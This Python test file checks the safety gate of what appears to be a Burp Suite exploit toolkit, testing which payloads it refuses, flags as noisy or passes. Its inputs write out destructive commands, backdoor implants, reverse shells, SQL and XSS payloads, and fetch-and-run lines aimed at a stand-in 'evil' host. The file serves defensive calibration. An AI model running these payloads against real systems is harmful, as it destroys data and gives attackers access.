"""Calibration tests for confirm_* exploit safety contract.

Run: uv run python -m unittest tests.test_safety -v
"""

import re
import unittest

from burpsuite_mcp.tools.exploit._safety import (
    HARD_DESTRUCTIVE_PATTERNS,
    SOC_LOUD_PATTERNS,
    QUIET_RCE_CMDS,
    is_quiet_rce_cmd,
    make_marker,
    soc_loud_warning,
    validate_payload,
)


class ValidatePayloadHardRefuseTests(unittest.TestCase):
    """HARD_DESTRUCTIVE — must refuse. Operator drops to send_raw_request."""

    def test_empty_payload_rejected(self):
        ok, reason = validate_payload("", "sqli")
        self.assertFalse(ok)
        self.assertIn("empty", reason)

    def test_rm_dash_rf_root_refused(self):
        ok, reason = validate_payload("; rm -rf /", "rce")
        self.assertFalse(ok)
        self.assertIn("destructive", reason)

    def test_rm_dash_rf_home_refused(self):
        ok, _ = validate_payload("rm -rf ~", "rce")
        self.assertFalse(ok)

    def test_rm_glob_refused(self):
        ok, _ = validate_payload("rm -rf *", "rce")
        self.assertFalse(ok)

    def test_drop_table_refused(self):
        ok, reason = validate_payload("'; DROP TABLE users; --", "sqli")
        self.assertFalse(ok)
        self.assertIn("destructive", reason)

    def test_drop_database_refused(self):
        ok, _ = validate_payload("DROP DATABASE prod;", "sqli")
        self.assertFalse(ok)

    def test_truncate_table_refused(self):
        ok, _ = validate_payload("TRUNCATE TABLE users", "sqli")
        self.assertFalse(ok)

    def test_delete_from_refused(self):
        ok, _ = validate_payload("DELETE FROM users WHERE 1=1", "sqli")
        self.assertFalse(ok)

    def test_update_set_refused(self):
        ok, _ = validate_payload("UPDATE users SET password='x'", "sqli")
        self.assertFalse(ok)

    def test_insert_into_refused(self):
        ok, _ = validate_payload("INSERT INTO admins VALUES('x')", "sqli")
        self.assertFalse(ok)

    def test_shutdown_refused(self):
        ok, _ = validate_payload("shutdown -h now", "rce")
        self.assertFalse(ok)

    def test_reboot_refused(self):
        ok, _ = validate_payload("; reboot", "rce")
        self.assertFalse(ok)

    def test_fork_bomb_refused(self):
        ok, _ = validate_payload(":(){ :|:& };:", "rce")
        self.assertFalse(ok)

    def test_dd_zero_refused(self):
        ok, _ = validate_payload("dd if=/dev/zero of=/dev/sda", "rce")
        self.assertFalse(ok)

    def test_mkfs_refused(self):
        ok, _ = validate_payload("mkfs.ext4 /dev/sda1", "rce")
        self.assertFalse(ok)

    def test_useradd_refused(self):
        ok, _ = validate_payload("useradd hacker", "rce")
        self.assertFalse(ok)

    def test_userdel_refused(self):
        ok, _ = validate_payload("userdel admin", "rce")
        self.assertFalse(ok)

    def test_passwd_user_refused(self):
        ok, _ = validate_payload("passwd root", "rce")
        self.assertFalse(ok)

    def test_net_user_add_refused(self):
        ok, _ = validate_payload("net user backdoor Pass1! /add", "rce")
        self.assertFalse(ok)

    def test_ssh_key_implant_refused(self):
        ok, _ = validate_payload(
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "rce"
        )
        self.assertFalse(ok)

    def test_ssh_key_redirect_refused(self):
        ok, _ = validate_payload("cat key > ~/.ssh/authorized_keys", "rce")
        self.assertFalse(ok)

    def test_xmrig_loader_refused(self):
        ok, _ = validate_payload("wget evil/xmrig && ./xmrig", "rce")
        self.assertFalse(ok)

    def test_format_drive_refused(self):
        ok, _ = validate_payload("format C: /Q", "rce")
        self.assertFalse(ok)

    def test_reason_names_vuln_type(self):
        ok, reason = validate_payload("DROP TABLE x", "sqli")
        self.assertFalse(ok)
        self.assertIn("confirm_sqli", reason)


class ValidatePayloadSocLoudPassTests(unittest.TestCase):
    """SOC-LOUD payloads pass the validate gate — operator is warned later."""

    def test_reverse_shell_dev_tcp_passes(self):
        # Reverse shells are legitimate RCE confirmation under RoE that permits
        # foothold. Must PASS validate; warning surfaces separately.
        ok, _ = validate_payload("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "rce")
        self.assertTrue(ok)

    def test_nc_listener_passes(self):
        ok, _ = validate_payload("nc -e /bin/sh 10.0.0.1 4444", "rce")
        self.assertTrue(ok)

    def test_python_pty_passes(self):
        ok, _ = validate_payload("python3 -c 'import pty;pty.spawn(\"/bin/sh\")'", "rce")
        self.assertTrue(ok)

    def test_powershell_enc_passes(self):
        ok, _ = validate_payload("powershell -EncodedCommand AAAA", "rce")
        self.assertTrue(ok)

    def test_etc_shadow_read_passes(self):
        ok, _ = validate_payload("cat /etc/shadow", "rce")
        self.assertTrue(ok)

    def test_select_star_users_passes(self):
        ok, _ = validate_payload("' UNION SELECT * FROM users --", "sqli")
        self.assertTrue(ok)

    def test_sqlmap_name_in_payload_passes(self):
        ok, _ = validate_payload("/* sqlmap test */ SELECT 1", "sqli")
        self.assertTrue(ok)


class ValidatePayloadBenignPassTests(unittest.TestCase):
    """Benign confirmation payloads must pass cleanly."""

    def test_id_command_passes(self):
        ok, _ = validate_payload("id", "rce")
        self.assertTrue(ok)

    def test_whoami_passes(self):
        ok, _ = validate_payload("whoami", "rce")
        self.assertTrue(ok)

    def test_select_version_passes(self):
        ok, _ = validate_payload("SELECT VERSION()", "sqli")
        self.assertTrue(ok)

    def test_select_current_user_passes(self):
        ok, _ = validate_payload("SELECT current_user()", "sqli")
        self.assertTrue(ok)

    def test_sleep_payload_passes(self):
        ok, _ = validate_payload("'; SELECT pg_sleep(5) --", "sqli")
        self.assertTrue(ok)

    def test_collaborator_passes(self):
        ok, _ = validate_payload(
            "<img src=x onerror=fetch('http://abc.oastify.com')>", "xss"
        )
        self.assertTrue(ok)

    def test_path_traversal_etc_passwd_passes(self):
        # /etc/passwd read is benign confirmation, not credential extraction.
        # /etc/shadow lives in SOC_LOUD.
        ok, _ = validate_payload("../../../etc/passwd", "path_traversal")
        self.assertTrue(ok)


class SocLoudWarningTests(unittest.TestCase):
    def test_quiet_payload_no_warning(self):
        self.assertEqual(soc_loud_warning("id"), "")
        self.assertEqual(soc_loud_warning("SELECT VERSION()"), "")
        self.assertEqual(soc_loud_warning("whoami"), "")

    def test_reverse_shell_warns(self):
        w = soc_loud_warning("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.assertTrue(w)
        self.assertIn("SOC-LOUD", w)

    def test_etc_shadow_warns(self):
        w = soc_loud_warning("cat /etc/shadow")
        self.assertTrue(w)
        self.assertIn("SOC-LOUD", w)

    def test_select_star_users_warns(self):
        w = soc_loud_warning("SELECT * FROM users")
        self.assertTrue(w)

    def test_powershell_enc_warns(self):
        w = soc_loud_warning("powershell -enc AAAA")
        self.assertTrue(w)

    def test_certutil_download_warns(self):
        w = soc_loud_warning("certutil -urlcache -split -f http://evil/x.exe")
        self.assertTrue(w)

    def test_curl_pipe_bash_warns(self):
        w = soc_loud_warning("curl http://evil/script.sh | bash")
        self.assertTrue(w)

    def test_xp_cmdshell_warns(self):
        w = soc_loud_warning("EXEC xp_cmdshell 'whoami'")
        self.assertTrue(w)

    def test_into_outfile_warns(self):
        w = soc_loud_warning("' UNION SELECT 'x' INTO OUTFILE '/tmp/x'")
        self.assertTrue(w)


class IsQuietRceCmdTests(unittest.TestCase):
    def test_id_quiet(self):
        self.assertTrue(is_quiet_rce_cmd("id"))

    def test_whoami_quiet(self):
        self.assertTrue(is_quiet_rce_cmd("whoami"))

    def test_uname_a_quiet(self):
        self.assertTrue(is_quiet_rce_cmd("uname -a"))

    def test_whitespace_trimmed(self):
        self.assertTrue(is_quiet_rce_cmd("  id  "))

    def test_case_insensitive(self):
        self.assertTrue(is_quiet_rce_cmd("WhoAmI"))

    def test_echo_simple_token_quiet(self):
        self.assertTrue(is_quiet_rce_cmd("echo MARKER-abc123"))

    def test_echo_with_pipe_loud(self):
        self.assertFalse(is_quiet_rce_cmd("echo hi | nc 10.0.0.1 1337"))

    def test_echo_with_semicolon_loud(self):
        self.assertFalse(is_quiet_rce_cmd("echo a; rm -rf /"))

    def test_echo_with_backtick_loud(self):
        self.assertFalse(is_quiet_rce_cmd("echo `whoami`"))

    def test_echo_with_command_subst_loud(self):
        self.assertFalse(is_quiet_rce_cmd("echo $(id)"))

    def test_arbitrary_cmd_loud(self):
        self.assertFalse(is_quiet_rce_cmd("cat /etc/passwd"))

    def test_reverse_shell_loud(self):
        self.assertFalse(is_quiet_rce_cmd("bash -i >& /dev/tcp/x/y"))


class MakeMarkerTests(unittest.TestCase):
    _MARKER_RE = re.compile(r"^[A-Za-z]+-[a-z0-9]{8}$")

    def test_default_prefix(self):
        m = make_marker()
        self.assertTrue(m.startswith("M-"))
        self.assertTrue(self._MARKER_RE.match(m), m)

    def test_custom_prefix(self):
        m = make_marker("XSSPROBE")
        self.assertTrue(m.startswith("XSSPROBE-"))
        self.assertTrue(self._MARKER_RE.match(m), m)

    def test_markers_unique(self):
        seen = {make_marker() for _ in range(200)}
        # 200 draws from 36^8 — collision probability ~0; <2 means rng bug
        self.assertGreater(len(seen), 195)

    def test_marker_length_invariant(self):
        m = make_marker("X")
        # X- + 8 chars = 10
        self.assertEqual(len(m), 10)

    def test_marker_no_metachars(self):
        # WAF entropy filters trip on punctuation; suffix must be [a-z0-9] only.
        for _ in range(50):
            m = make_marker()
            suffix = m.split("-", 1)[1]
            self.assertTrue(suffix.isalnum())
            self.assertEqual(suffix.lower(), suffix)


class PatternTableInvariantTests(unittest.TestCase):
    """Defensive invariants — catch regression if someone reorders patterns."""

    def test_hard_patterns_compiled_case_insensitive(self):
        for pat in HARD_DESTRUCTIVE_PATTERNS:
            self.assertTrue(pat.flags & re.IGNORECASE)

    def test_soc_loud_patterns_compiled_case_insensitive(self):
        for pat in SOC_LOUD_PATTERNS:
            self.assertTrue(pat.flags & re.IGNORECASE)

    def test_no_overlap_in_quiet_rce_with_loud(self):
        # Belt-and-suspenders: anything in QUIET_RCE_CMDS must NOT fire SOC_LOUD.
        for cmd in QUIET_RCE_CMDS:
            self.assertEqual(soc_loud_warning(cmd), "", f"{cmd!r} false-positives loud")


if __name__ == "__main__":
    unittest.main()
